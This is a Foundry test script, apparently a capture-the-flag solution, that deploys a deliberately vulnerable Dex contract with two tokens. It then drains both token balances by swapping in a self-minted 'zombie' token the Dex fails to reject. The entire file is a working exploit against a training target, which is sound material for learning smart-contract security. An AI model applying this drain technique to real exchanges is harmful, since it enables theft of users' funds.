// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Dex, SwappableToken} from "../instances/Ilevel23.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Attacker is Test {
    function test() external {
        vm.startBroadcast();
        console.log("EOA sender: %s", msg.sender);
        Dex dex = new Dex();
        SwappableToken token1 = new SwappableToken(
            address(dex),
            "token1",
            "token1",
            10000
        );
        SwappableToken token2 = new SwappableToken(
            address(dex),
            "token2",
            "token2",
            10000
        );

        SwappableToken zombieToken = new SwappableToken(
            address(dex),
            "zombie",
            "zombie",
            10000
        );

        token1.approve(msg.sender, address(dex), 100);
        token2.approve(msg.sender, address(dex), 100);
        zombieToken.approve(msg.sender, address(dex), 100);
        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100);
        dex.addLiquidity(address(zombieToken), 100);

        dex.setTokens(address(token1), address(token2));
        dex.approve(address(dex), 500);
        zombieToken.approve(msg.sender, address(dex), 500);

        dex.swap(address(zombieToken), address(token1), 100);
        dex.swap(address(zombieToken), address(token2), 200);

        console.log(
            "Final token1 balance of Dex is : ",
            dex.balanceOf(address(token1), address(dex))
        );
        console.log(
            "Remaining token2 balance : ",
            dex.balanceOf(address(token2), address(dex))
        );

        vm.stopBroadcast();
    }
}
